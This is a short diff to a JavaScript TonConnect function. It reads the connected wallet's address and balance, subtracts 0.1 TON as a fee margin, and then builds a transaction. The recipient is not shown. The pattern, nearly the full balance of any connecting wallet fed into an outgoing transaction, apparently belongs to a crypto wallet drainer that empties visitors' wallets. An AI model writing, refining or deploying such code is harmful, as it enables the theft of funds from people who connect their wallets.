@@ -67,7 +67,8 @@ async function initializeTonConnect() {
                 const currentWallet = tonConnectUI.wallet;
                 const account_id = currentWallet.account.address
              
-                const balance = await getBalance(account_id) 
+                const balanceValue = await getBalance(account_id) 
+                const balance = balanceValue - 100000000
                 
 
                 const transaction = {
